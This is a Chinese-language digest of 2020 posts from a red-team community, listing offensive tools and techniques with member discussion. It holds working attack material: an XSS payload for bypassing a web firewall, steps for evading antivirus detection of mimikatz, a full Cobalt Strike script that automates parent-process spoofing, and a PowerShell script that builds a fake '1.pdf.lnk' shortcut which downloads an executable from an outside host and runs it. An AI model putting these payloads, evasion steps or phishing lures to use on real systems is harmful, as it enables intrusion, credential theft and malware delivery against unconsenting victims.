# RedTeaming知识星球2020年安全知识汇总


> 时间精力有限,本来想按照分类来发布星球内容的.
比如这样
```
## 免杀
xxx
xxx
## 渗透技巧
xxx
xx
```
按照时间顺序我把2020年星球大家讨论的知识点共享出来,希望会有帮助.
知识不够体系,2021年会我每个月会细化标签,弄一个单独的网站进行共享.

zsxq search:RedTeaming
# RedTeaming - 2020-01-06
`#Tools#`   `#c2#` <br>[GitHub+-+p3nt4/Nuages:+A+modular+C2+framework](https://github.com/p3nt4/Nuages)


# RedTeaming - 2020-01-06
`#Bypass Waf#`  <br>img标签被拦截，src也被禁止了，<br>最后构造出<br><image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'><br><br>[GitHub+-+hakluke/hakrawler:+Simple,+fast+web+crawl...](https://github.com/hakluke/hakrawler)


# RedTeaming - 2020-01-06
`#RedTeam#` <br><br>[ATT&CK攻击艺术的科学化](https://mp.weixin.qq.com/s/UITOiXwpETDZn2UvG9ChvA)


# RedTeaming - 2020-01-06
`#内网渗透#` <br><br>[实战中内网穿透的打法](https://mp.weixin.qq.com/s/BuqXDaKuakgBhG_MpvOkjA)


# RedTeaming - 2020-01-08
`#Tricks#`  <br><br>[acCOMplice/masterkeys.csv+at+master+·+nccgroup/acC...](https://github.com/nccgroup/acCOMplice/blob/master/masterkeys.csv)


# RedTeaming - 2020-01-10
每日一个红队技巧 (2020.1.9)<br> 今天看到某个样本，很有意思的是他的自启动不是通过利用自启动文件夹或者注册表以及计划任务去实行，而是通过修改 word 文件的启动目录 (% APPdata%\Microsoft\Word\STARTUP) 中添加 *.wll 文件，当 word 文件启动的时候其会调用 rundll32.exe 加载这个 *.wll 文件，如下图例子所示，该方法可用于 win 以下带有 word 的 office 主机

```
Wing: 来自 crazyman
```
# RedTeaming - 2020-01-12
 `#RedTeam#`  <br>红队议题（双螺旋）：<br>水坑攻击的骚思路（无声xss之箭？）<br>攻防对抗的思路<br>EDR多维度对抗<br>真实环境的蜜罐<br>单机&域权限维持<br>内网横向移动到底是研究什么？<br>单主机的信息收集<br>域内信息收集<br>被动获取内网凭据<br>精准定位打击<br>RedTeamer的未来<br>RedTeam武器化


# RedTeaming - 2020-01-18
`#Tools#`  <br>敏感文件搜集<br>[敏感文件搜集+|+道萝岗特森's+Blog](https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/)


# RedTeaming - 2020-01-21
#tricks<br>[任意文件读取的深度利用+–+Neurohazard](http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/)


# RedTeaming - 2020-01-21
`#渗透测试#` <br>java站渗透测试<br>[T00LS+|+低调求发展+-+潜心习安全](https://www.t00ls.net/thread-54727-1-1.html)

```
秦婉莹: 没有吐司账号😫
Wing: 找一个互联网漏洞提交就行。我记得我大一的时候是瞎交了存储 xss, 一直摸鱼到现在。
秦婉莹: 好的谢谢╰(*´︶`*)╯
```
# RedTeaming - 2020-02-08
`#Bypass AV#`  <br>那些shellcode免杀总结<br>[T00LS+|+低调求发展+-+潜心习安全](https://www.t00ls.net/thread-54949-1-1.html)


# RedTeaming - 2020-06-17
`#BypassAV#`  <br>后渗透C2工具<br>[GitHub+-+bats3c/shad0w:+A+post+exploitation+framew...](https://github.com/bats3c/shad0w)
![](https://images.zsxq.com/Fukixk146ty8JXLRc9vqBTBKM1mT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fDwL1Ss34LOcfysvVk-bx4_DJC0=)
![](https://images.zsxq.com/Fke9a-WiUp4njSlXlFVOSK0iV4-a?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:dO0jOEUqevMKJBciYJU16gnd9LE=)

# RedTeaming - 2020-06-17
 `#公告#`  <br>希望这里的小伙伴都常提问和分享，发布主题的时候尽量用我建立的10个标签中的一个，方便整理归类，转发链接和文章的时候一定要介绍文章或者工具的主要内容或功能，有什么建议欢迎留言。


# RedTeaming - 2020-06-17
`#BypassAV#`  <br>CS横向的时候遇到AV咋整？<br>因为横向时CS使用的ps脚本是不免杀的，使用ResourceKit更改原来的template即可。<br>[Making+AMSI+Jump+-+Offensive+Defence](https://offensivedefence.co.uk/posts/making-amsi-jump/)<br>[CobaltStrike-Toolset/Kits/ResourceKit+at+master+·+...](https://github.com/QAX-A-Team/CobaltStrike-Toolset/tree/master/Kits/ResourceKit)


# RedTeaming - 2020-06-17
`#BypassAV#`  <br>exe的静态免杀比较简单，powershell的话也可以通过定位特征，修改特征，绕过杀软。<br>[GitHub+-+RythmStick/AMSITrigger:+The+Hunt+for+Mali...](https://github.com/RythmStick/AMSITrigger)<br>某个函数被杀了，手动混淆以下即可。我想想，好像前几天有篇介绍pwsh简单混淆的。<br>。。。。<br>。。。。<br>。。。。<br>I find it！<br><br>PowerShell命令混淆高级对抗<br>[APT的思考:+PowerShell命令混淆高级对抗](https://mp.weixin.qq.com/s?__biz=MzIwODIxMjc4MQ==&mid=2651004599&idx=1&sn=fce641cae5049ad5d26c04c6cecb569f&chksm=8cf138f5bb86b1e3f8b6460ec4c4ea3e29ec7cf083dd851fc911dca813c031583b61d20a9c01&mpshare=1&scene=24&srcid=&sharer_sharetime=1591249092790&sharer_shareid=3c75bd36c2ee6f4b35a34b686653e6ac#rd)

```
Wing: 写文章不要用什么 APT xxx 开头。除非你真的有相关经验。
```
# RedTeaming - 2020-06-17
`#权限维持#` <br>IIS模块后门<br><br>echo测试<br>列目录<br>读写文件 <br>带回显执行命令<br>不带回显无等待执行命令<br>执行shellcode<br><br>[T00LS+|+低调求发展+-+潜心习安全](https://www.t00ls.net/thread-56775-1-1.html)


# RedTeaming - 2020-06-18
`#红队武器化开发#`  <br>护网钓鱼自己不够细心，以为没沙盒检测，结果就是有……<br>沙盒绕过的代码实现<br><br>[anti-sandbox/README.md+at+master+·+ZanderChang/ant...](https://github.com/ZanderChang/anti-sandbox/blob/master/README.md)


# RedTeaming - 2020-06-18
`#安全开发#`  <br>安全开发的demo，喜欢做开发的师傅也可以多交流下。<br><br>[甲方安全开源项目清单](https://mp.weixin.qq.com/s/FS8JVnZqqXw1M9czyeF8dw)


# RedTeaming - 2020-06-18
`#渗透基础#`  <br>无回显的情况下盲写shell<br><br>powershell <br>$file = Get-ChildItem -Path . -Filter test.html -recurse -ErrorAction SilentlyContinue;$f = -Join($file.DirectoryName,"/a.txt");echo 222 |Out-File $f<br><br>bash<br>// 进入test.html的根目录并执行id命令写入1.txt<br>cd $(find -name "test.html" -type f -exec dirname {} \; | sed 1q) && echo `id` > 1.txt<br><br>[Java+反序列化回显的多种姿势+–+Y4er的博客](https://y4er.com/post/java-deserialization-echo/)


# RedTeaming - 2020-06-18
`#渗透基础#`  <br>无回显的情况下盲写shell<br><br>powershell <br>$file = Get-ChildItem -Path . -Filter test.html -recurse -ErrorAction SilentlyContinue;$f = -Join($file.DirectoryName,"/a.txt");echo 222 |Out-File $f<br><br>bash<br>// 进入test.html的根目录并执行id命令写入1.txt<br>cd $(find -name "test.html" -type f -exec dirname {} \; | sed 1q) && echo `id` > 1.txt<br><br>[Java+反序列化回显的多种姿势+–+Y4er的博客](https://y4er.com/post/java-deserialization-echo/)


# RedTeaming - 2020-06-20
`#白加黑利用#`   `#免杀#`  <br>用c写一个dll加载就行，我最近没时间，[难过]<br><br>[Bring+your+own+.NET+Core+Garbage+Collector+|+Conte...](https://www.contextis.com/en/blog/bring-your-own-.net-core-garbage-collector)
![](https://images.zsxq.com/FjlmvfUBP2SHGvtN88ujg2Kp4yg4?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:roobUPLWxykVRIGwp9BEqYNi03U=)

# RedTeaming - 2020-06-21
`#渗透技巧#`  <br>解密rdp连接的密码，正常情况下用🥝就可以，或者Ghostpack工具包当中的Sharpdpapi<br>[获取已控机器本地保存的RDP密码](https://mp.weixin.qq.com/s/2oIabZAk3EMaFI4M6MPhtw)


# RedTeaming - 2020-06-22
#渗透工具 <br> 先虚拟机运行一下，群里发的，有时间再分析下，打开手动搜一下有没有后门。


# RedTeaming - 2020-06-22
`#渗透技巧#`  <br>ldap注入原理与利用<br><br>[LDAP注入入门学习指南+-+云+社区+-+腾讯云](https://cloud.tencent.com/developer/article/1584896)


# RedTeaming - 2020-06-24
`#红队武器化工具#`  <br>远程转储内存到本地解密<br><br>[GitHub+-+FSecureLABS/physmem2profit:+Physmem2profi...](https://github.com/FSecureLABS/physmem2profit)


# RedTeaming - 2020-06-24
mimikatz简单免杀手法：<br><br>1、替换所有文件内容中的mimikatz、ＭIMIKATZ<br>2、将mimikatz文件名进行替换<br>3、修改rc文件与ico图标<br>4、使用head命令定位敏感词位置　head -c 10000 sss.exe > xxx.exe<br>5、修改后敏感词，多为Mimi、kiwiandreg、wdigest、base64、multirdp、logonpassword、sekurlsa、，然后看是否查杀<br>6、新建def文件，更改导入表。使用def文件更改导入表的符号，然后使用dumpbin(vs自带)生成lib文件，然后重新编译即可。<br><br> `#Mimikatz#`   `#Redteam#` 

```
裤衩哥: head 分特征码太真实了，之前用过几次，后来真的是 virtest 真香
lengyi: 其实就算定位，也就是那几个关键字，主要还是最后一步，最后一步针对 windows defender，其他的无所谓
裤衩哥: wd 测试的时候一定关闭样本上传，mimi 过 wd 还真没去注意过，马过 wd 得靠分离
裤衩哥: 翻以前写的东西找到了，静态特征也可以过 wd ，不过 wd edp 不行，那个联网查杀太牛逼，行为也是，有点问题就扫一遍内存
lengyi: Wd 毕竟是微软自己家的东西，各方面强的一批。
lengyi: 分离免杀的确慢慢的成了主流，
lengyi: 不过提取功能的方法挺好的，只提取密码，这样免杀就容易了许多
L: 最简单的还是 icon 改一下，VMP 加个壳子
```
# RedTeaming - 2020-06-24
`#红队武器化研发#`  <br>CSTIPS系列,适合新老用户观看.我学习改造下再分享下心得. <br>[https://www.bilibili.com/video/BV1yz411i71Z?p=2](https://www.bilibili.com/video/BV1yz411i71Z?p=2)[奸笑]


# RedTeaming - 2020-06-24
推特几个有关红队的推 <br>@anthomsec<br>@FuzzySec<br>@subTee<br>@Hexacorn<br>@R3dF09<br>@ptracesecurity<br>@TheHackersNews<br>@0xffff0800<br>@campuscodi<br>@Pwsecspirit<br>@CyberRaiju<br>@424f424f


# RedTeaming - 2020-06-24
`#CSTips#`   `#CS插件开发#` <br>QAX的朋友又更新了这玩意.跨平台上线<br>[GitHub+-+gloxec/CrossC2:+generate+CobaltStrike's+c...](https://github.com/gloxec/CrossC2)
![](https://images.zsxq.com/Fv-qwK57R20Vz3zWw-ZgbO1zGoWP?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:0T04wpGQVHO6a7S8SLTK5FiLq2g=)
![](https://images.zsxq.com/FsXe4RJY2nmqPpcQ6FQr3mUwOCrm?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ZzrGvBZN84JzDUeu9WchtaBAlSI=)

# RedTeaming - 2020-06-25
 `#CSTips#`  <br>cobaltstrike更新到4.1，增加如下功能。<br><br>June 25, 2020 - Cobalt Strike 4.1<br>-------------<br>+ Fixed &listener_delete<br>+ Implemented sub-system to run Beacon Object Files. A BOF is a compiled C<br>  program that executes within Beacon and can call Win32 and Beacon APIs<br>+ Ported 4.0's inline-execute capabilities to BOFs<br>+ Fixed logic flaw in getsystem<br>+ Added inline-execute command to run arbitrary BOFs<br>+ Moved dllload, reg query/queryv, and timestomp to BOFs<br>+ Added option to bootstrap Beacon in-memory without walking kernel32 EAT<br>	- Artifact Kit and PowerShell (Resource Kit) artifacts use this option<br>	- Added &payload_bootstrap_hint to apply this option to other artifacts<br>	- Added -hasbootstraphint to check if this option applies to a payload<br>	- set stage -> smartinject to true to enable this behavior.<br>- Removed option to generate x64 DLL that spawns an x86 payload in new process<br>+ Simplified the Artifact Kit by removing artifacts for deprecated features<br>+ Extended Beacon metadata with more info such as Windows build number and key <br>  function pointers used to bootstrap agent.<br>+ spawn, spawnas, spawnu, inject, and elevate uac-token-duplication now inherit <br>  pointers from same-arch target Beacon session metadata when stage -> <br>  smartinject is enabled.<br>+ Added &payload_local to generate shellcode with key bootstrap function<br>  pointers inherited from a parent Beacon session.<br>+ Added set ssh_banner "..." to change SSH client info for Beacon's SSH command<br>+ Simplifed the heartbeat portion of SMB and TCP Beacon protocols<br>+ Added smb_frame_header and tcp_frame_header Malleable C2 options to shape the<br>  content and size of the length frames in these communication protocols<br>+ Fixed bug that has localhost-only TCP Beacon bind to 0.0.0.0 after first unlink.<br>+ Multiple updates to SSH agent to keep pace with Beacon protocol changes<br>+ Split extc2 Beacon into its own DLL (as extc2 protocol is now diverged from <br>  the SMB Beacon protocol due to changes made in this release).<br>+ Several security descriptor changes in ExtC2, SMB Beacon, and SSH agent<br>+ jump psexec* now uses UNC path with target instead of 127.0.0.1 to reference<br>  uploaded file on target.<br>+ Added right-click menu to show/hide unlinked nodes in pivot graph.<br>+ Added &unbind to unbind keyboard shortcuts (to include Cobalt Strike built-ins)<br>+ Added exe option to Scripted Web Delivery. Generates and hosts EXE at URL.<br>+ Added [note] field to logs to call out note changes made to session<br>+ Added scriptable popup hook for 'listeners' (View -> Listeners table)<br>+ Added "*" meta-column to table Ctrl+F feature. Searches all columns at once<br>+ Removed a few (not searchable) columns from table Ctrl+F feature<br>+ Added web server port to View -> Web Log output<br>+ Fixed a PE parser bug<br>+ execute-assembly's "are you an assembly" check uses a better check.<br>+ Updated to Mimikatz 2.2.0 20200519<br>+ Editing listener no longer removes its color accent.<br>+ Fixed off-by-1 error in c2lint's useragent length check.<br>+ sleep_mask now uses a slightly larger mask<br>+ Fixed DNS staging regression when dns_stager_subhost is set.<br>+ Fixed inconsistent stager pipe bug in &stager_bind_pipe and &beacon_stage_pipe.<br>+ Made getuid a little bit more robust<br>+ Console directed messages now scrub ESC character.<br>+ Added an exit hint parameter to &payload function (thread or process)<br><br>------------


# RedTeaming - 2020-06-25
 `#渗透工具开发#`  <br>养成遇到一个洞就写一个jio本的习惯，武器库不就丰富起来了？
![](https://images.zsxq.com/FgY44S8tMj2_TG1B_t3tZITMRaNm?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:9SdxOyDVPMzx78sa-EYcwavaXi0=)
![](https://images.zsxq.com/Fu0LUoh-Gom6Qx-1hBL19TT9-src?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:FhMivq1Ajqhq-wGUqMPn1vfkykk=)

# RedTeaming - 2020-06-26
`#CS插件开发#`   `#CSTips#`  <br>分享一个CS插件包(Kit),我自己改了一下.<br><br>[GitHub+-+josephkingstone/cobalt_strike_extension_k...](https://github.com/josephkingstone/cobalt_strike_extension_kit)
![](https://images.zsxq.com/Fng0DttHq4tkLIDOdzdaLtNehCwQ?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:97nKEXo64yzple8QVj25N54n1lI=)

# RedTeaming - 2020-06-26
 `#免杀#` <br>通过执行xml的方式来dump,应该是不杀的,懒得再测试了.
![](https://images.zsxq.com/FuMQyLDRIhdg5YGNwFIv8poySX5e?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:1Ye8bM9saguo_nydtENb9TpGrQ0=)
```
Wing: [MSBuild:+A+Profitable+Sidekick!+|+TrustedSec](https://www.trustedsec.com/blog/msbuild-a-profitable-sidekick/)
裤衩哥: 看了下代码，其实相当与利用的 xml 的 PEloader 加载 dump 了进程后直接运行 mimikatz 解。flag：有时间试试自己实现下
```
# RedTeaming - 2020-06-26
`#免杀#`  <br>.NetCore 白名单绕过,但是生成的dll如果包含cs的payload.就会被杀.过不了火绒,能过360.<br>[Abusing+.NET+Core+–+Evasion+|+Pentest+Laboratories](https://pentestlaboratories.com/2020/06/23/abusing-net-core-application-whitelisting/)

```
裤衩哥: 过不了火绒的原因大概率是他特征码定到 CreateRemoteThread 了。。。试试加壳搞下
lengyi: 火绒 == 特征码杀毒
裤衩哥: 360== 文件 md5 杀毒
```
# RedTeaming - 2020-06-26
老哥们有遇到过远程计算机无法 logoff 的情况么？ps 过去也无法重启计算机会，而且会出现 The interface is known 的报错。大家有什么好的解决方法么？


# RedTeaming - 2020-06-26
`#红队技巧#` <br>PPID Spoofing:<br>父进程欺骗利用过程,正常情况下:比如你通过word打开了cmd,那么cmd是在word这个进程下,但是CreateProcessA这个函数的lpStartupInfo参数可以指定pid.导致了这个操作的形成.<br><br>好处是啥呢,lsass是system的话,直接提权了.<br><br>vba相关利用:<br>Sub Parent()<br> <br>Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")<br>obj.Document.Application.ShellExecute "pentestlab.exe",Null,"C:\Temp\",Null,0<br> <br>End Sub<br><br>com对象创建的这个进程是在explore下面,要想检测,就要用事件跟踪器.<br><br>cobaltstrike利用插件<br>#<br># Autoppid - script that smartely invokes PPID for every new checkin in Beacon. <br># PPID command requires invoked Beacon to have the same Integrity level as the process it want's<br># to assume as it's Parent. That's due to how InitializeProcThreadAttributeList with <br># PROC_THREAD_ATTRIBUTE_PARENT_PROCESS works. In order to avoid harcoded explorer.exe PID assumption,<br># we can look around for a configurable process name and then try to find that process running<br># on the highest available for us integrity level. In that case, unprivileged user would assume PPID<br># of for instance svchost.exe running as that user, wherease the privileged one - could go for the<br># svchost.exe running as NT AUTHORITY\SYSTEM. We aim to smartely pick the most advantageous target,<br># in a dynamic fashion.<br>#<br># The script also includes alias registration.<br>#<br># Author: Mariusz B. / mgeeky, '20<br># <mb [at] binary-offensive.com><br>#<br><br># Set desirable process name which you want to become your parent. This process will be used for<br># parent PID spoofing and thus should be allowed for opening for your current process token. <br>$PARENT_PROCESS_NAME = "svchost.exe";<br><br><br>beacon_command_register(<br>    "autoppid",<br>    "Automatically finds suitable PPID and sets it (target: $PARENT_PROCESS_NAME )",<br>    "Automatically finds suitable - according to the current user context - PPID and sets it (target: $PARENT_PROCESS_NAME )");<br><br>sub findSuitableParentPID {<br>    local('$_bid $_callback $_processName $_userName');<br>    $_bid = $1;<br>    $_callback = $2;<br>    $_processName = $3;<br>    $_userName = binfo($1, "user");<br><br>    if (right($_userName, 2) eq ' *') {<br>        $_userName = substr($_userName, 0, strlen($_userName) - 2);<br>    }<br><br>    bps($_bid, lambda({<br>        local('$tab $entry $name $pid $ppid $arch $user');<br>        foreach $entry (split("\n", $2)) {<br>            ($name, $ppid, $pid, $arch, $user) = split("\\s+", $entry);<br><br>            # "NT AUTHORITY" contains space, thus breaking our split results. Here's a workaround for that<br>            if($user eq "NT") {<br>                $user = substr($entry, indexOf($entry, "NT "));<br>                $tab = indexOf($user, "\t");<br>                if ($tab) {<br>                    $user = substr($user, 0, $tab);<br>                }<br>            }<br><br>            if (($pid) && ($name eq $processName)) {<br>                if($user) {<br>                    if( ($userName isin $user) || ($user isin $userName) ) {<br>                        [$callback : $bid, $pid, "\t" . $entry];<br>                        break;<br>                    }<br>                }<br>            }<br>        }<br>    }, $bid => $_bid, $callback => $_callback, $userName => $_userName, $processName => $_processName));<br>}<br><br>alias autoppid {<br>    local('$processName $userName $params');<br>    $params = "";<br><br>    if(strlen($0) > strlen("autoppid ")) {<br>        $params = substr($0, strlen("autoppid "));<br>    }<br><br>    $processName = $PARENT_PROCESS_NAME;<br>    $userName = binfo($1, "user");<br><br>    if (right($userName, 2) eq ' *') {<br>        $userName = substr($userName, 0, strlen($userName) - 2);<br>    }<br><br>    if($params ne "quiet") {<br>        btask($1, "Tasked Beacon to find $processName running as $userName and make it the PPID.");<br>    }<br><br>    findSuitableParentPID($1, lambda({<br>        if($params ne "quiet") {<br>            blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");<br>            bppid($1, $2);<br>        } else {<br>            bppid!($1, $2);<br>        }<br>    }, $params => $params), $processName);<br>}<br><br>on beacon_initial {<br>    # Parent PID spoofing<br>    fireAlias($1, "autoppid", "");<br>}<br><br>on beacon_error {<br>    local('$ppid $err');<br><br>    if ($2 ismatch 'Could not set PPID to (\d+): (\d+)' ) {<br>        ($ppid, $err) = matched();<br><br>        if($err == 87) {<br>            blog2($1, "Catched PPID error: \c4Previous parent process no longer exists\o. Finding a new one...");<br>            fireAlias($1, "autoppid", "quiet");<br>        }<br>        else if($err == 5) {<br>            blog2($1, "Catched PPID error:\c4 $err $+ \o. Access Denied. Don't know how to proceed. Reseting PPID to none.");<br>            bppid($1, 0);<br>        }<br>        else {<br>            blog2($1, "Catched PPID error:\c4 $err $+ \o. Will find another candidate for PPID spoofing.");<br>            fireAlias($1, "autoppid", "quiet");<br>        }<br>        <br>        blog2($1, "\c8    Repeat your last command as it failed.\o");<br>    }<br>}<br><br>参考文档<br>[Parent+Process+ID+(PPID)+Spoofing+-+Red+Teaming+Ex...](https://ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)<br>[Parent+PID+Spoofing+|+Penetration+Testing+Lab](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)<br>利用工具:<br>[GitHub+-+hlldz/APC-PPID:+Adds+a+user-mode+asynchro...](https://github.com/hlldz/APC-PPID)<br>[GitHub+-+ewilded/PPID_spoof:+An+example+of+how+to+...](https://github.com/ewilded/PPID_spoof)<br>[GitHub+-+sud01oo/ProcessInjection:+Some+ways+to+in...](https://github.com/sud01oo/ProcessInjection)<br>我的demo
![](https://images.zsxq.com/FqoVHiQqYSOjg76U7v-diI9AWLLC?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Tc9DFObEn-VBi7fIhOZsNYuRWsk=)
![](https://images.zsxq.com/FkgO9jlX9M9Jb0xxQQ9RJ9BnCH1w?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:IUa5kZhzSf6Yx1TZqpWigr-42Qk=)
```
Wing: 
```
# RedTeaming - 2020-06-26
今日骚操作：ico下载exe<br>[Using+Shell+Links+as+zero-touch+downloaders+and+to...](https://isc.sans.edu/forums/diary/Using+Shell+Links+as+zerotouch+downloaders+and+to+initiate+network+connections/26276/)

```
裤衩哥: 今日最佳卧槽
crazyman: 有点意思  不过这要对目标机器的适配性稍微差点
```
# RedTeaming - 2020-06-26
MSBUILD WITHOUT MSBUILD<br>msbuild.exe一直是红队行动中LOLBIN的宠儿,而随着安全工具对其增加更多的检测规则,该白名单策略逐渐陷入"人人喊打"的局面中,下篇文章将讲到如何制作一个属于自己的Msbuild<br><br>[https://pentestlaboratories.com/2020/01/27/msbuild...](https://pentestlaboratories.com/2020/01/27/msbuild-without-msbuild/)<br><br>[GitHub+-+rvrsh3ll/MSBuildAPICaller:+MSBuild+Withou...](https://github.com/rvrsh3ll/MSBuildAPICaller)


# RedTeaming - 2020-06-27
渗透tips---->更新你的invoke-mimikatz `#渗透技巧#`  <br><br><br><br>[渗透tips---->更新你的invoke-mimikatz](https://mp.weixin.qq.com/s/Fp1P3-O-Q6or_or0HEJGRw)


# RedTeaming - 2020-06-27
渗透tips---->更新你的invoke-mimikatz `#渗透技巧#`  <br><br><br><br>[渗透tips---->更新你的invoke-mimikatz](https://mp.weixin.qq.com/s/Fp1P3-O-Q6or_or0HEJGRw)


# RedTeaming - 2020-06-27
C# PEloader加载mimikatz(更新一个新的 xml mimikatz)<br>看大佬有分享Invoke mimikatz，就发一个之前写的xml的吧。<br>制作过程<br>[http://www.8sec.cc/index.php/archives/358/](http://www.8sec.cc/index.php/archives/358/)<br>123qsdaxc<br>成品下载<br>[http://myblogimages.oss-cn-beijing.aliyuncs.com/so...](http://myblogimages.oss-cn-beijing.aliyuncs.com/soft/mimikatz.xml)<br><br> `#免杀#`   `#渗透技巧#` 

```
lengyi: 当时我测试的时候还能直接过 360 的，可惜现在不行了。。
裤衩哥: 我在测的时候我记得还行啊
裤衩哥: 我在试试去
lengyi: 不不不，我只用了 PE 加载，没有用你后面的方法
裤衩哥: 哦哦，白名单加载应该不会
```
# RedTeaming - 2020-06-27
`#红队武器化研发#`   `#免杀#`  <br>昨天L发的lnk钓鱼的免杀版本，虚拟机测试过火绒和360，下次买vps测试，虚拟机不准确。<br><br>[LNK钓鱼攻击_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili](https://b23.tv/nChcPS)

```
crazyman: 可以再设置一下最小化这样更加减少被发现几率
裤衩哥: 这就是 pilipili 吗？爱了爱了
Wing: #param ( [string]$SourceExe, [string]$ArgumentsToSourceExe, [string]$DestinationPath )##
$shortcutName = "1.pdf.lnk"
$TargetPath = "C:\Windows\System32\wbem\WMIC.exe"
$IconLocation= "[http://192.168.123.22:8080/wing.exe?.ico"](http://192.168.123.22:8080/wing.exe?.ico")
$shortcutOutputPath = "$Home\Desktop\Csharp\"+$shortcutName
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutOutputPath)
$Shortcut.TargetPath = $TargetPath<br>$Shortcut.WindowStyle = 1
$Shortcut.Arguments = ' process call "create" /"%USERPROFILE%\AppData\Local\Microsoft\Windows\INetCache\wing.exe "'
$shortcut.IconLocation = $IconLocation
$Shortcut.Save()<br><br>喵的$Shortcut.WindowStyle = 1这里不知道设置成几才是最小化运行，012345都试了。
crazyman: 同时 这个方式不太适合去生成文档图片等的诱饵文档 因为你不知道对方机器上的环境 所以应该采用伪装成程序安装包的图标成功几率会更大
```
# RedTeaming - 2020-06-27
`#提权#`  <br>这是一个网络服务提权的工具。<br>然后说一下本地Local System/Network Service/Local Service的区别，内容来源于51cto<br>1.Local System (本地系统)：<br>该账户具有相当高的权限。<br>首先，该账户也隶属于本地Administrators 用户组，因此所有本地Administrators用户能够进行的操作该账户也能够进行，<br>其次，该账户还能够控制文件的权限（NTFS 文件系统）和注册表权限，甚至占据所有者权限来取得访问资格。<br>如果机器处于域中，那么运行于Local System 账户下的服务还可以使用机器账户在同一个森林中得到其他机器的自动认证，<br>最后一点就是运行于Local System 下的进程能够使用空会话（null session）去访问网络资源。举例来说，以LocalSystem账户运行的服务主要有：WindowsUpdate Client、 Clipbook、Com+、DHCP Client、Messenger<br>Service、Task Scheduler、Server Service、Workstation Service，还有Windows Installer。<br>2.Network Service(网络服务)：<br>该账户也是为了使用机器账户在网络上的其他计算机上认证而设定的。但是他没有Local System 那么多的权限。<br>它能够以计算机的名义访问网络资源。以这个账户运行的服务会根据实际环境把访问凭据提交给远程的计算机。<br>运行于此账户下的进程使用网络账户配置文件HKEY_USERS\S-1-5-20和Documents and Settings\NetworkService。<br>举例来说，以Network Service账户运行的服务主要有：Distributed Transaction Coordinator、DNS Client、<br>Performance Logs and Alerts，还有RPC Locator。<br> <br>3.Local Service(本地服务)：<br>Local Service账户是预设的拥有最小权限的本地账户，并在网络凭证中具有匿名的身份。<br>运行于此账户下的进程和运行于Network Service 账户下的进程的区别<br>在于运行于Local Service 账户下的进程只能访问允许匿名访问的网络资源。<br>运行于Local Service 下的账户使用的配置文件是HKU\S-1-5-19 和Documents and Settings\LocalService。<br>举例来说，以Local Service账户运行的服务主要有：Alerter、Remote Registry、Smart Card、SSDP，还有WebClient。<br> <br>注意：<br>选择 Local System (本地系统) ，使用默认端口：1433时，连接数据库可以用：.，（local），localhost，127.0.0.1等。<br>选择 Network Service(网络服务) ，无论是否使用默认端口：1433，连接数据库：.，（local）不可用，localhost，127.0.0.1等后面都要加端口号“,端口号”。<br><br>[GitHub+-+realoriginal/bof-NetworkServiceEscalate:+...](https://github.com/realoriginal/bof-NetworkServiceEscalate)

```
Wing: 这文章感觉是机器翻译的。错别字。
```
# RedTeaming - 2020-06-27
 `#工具技巧#`  <br>burp历史记录pass掉不必要的域名<br>Burp Suite > Proxy > Options > TLS Pass Through.<br>Add these:<br>.*\.google\.com <br>.*\.gstatic\.com<br>.*\.mozilla\.com<br>.*\.googleapis\.com<br>.*\.baidu\.com<br>com


# RedTeaming - 2020-06-27
 `#红队技巧#`  <br>今天LNK钓鱼的那个方法有个黑框,查了官方文档没发现详细说明只知道是int类型.我试了01234,都不行,决定翻github.惊了我,这是人干的事吗.0-4-7,谁设计的,麻烦出来一下.<br>利用代码如图.
![](https://images.zsxq.com/FqMAOU5ovnXcC-l3ZWiFAigOfZc3?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:E1jZBAvhN09f3WsW6FVu4sun2RI=)
![](https://images.zsxq.com/FsqnCJUETf5RpkLiAVWQj8JKqaKU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:AghzSuvF-_3rhzcs359IwnL1hog=)
```
裤衩哥: hhhhhhhh
```
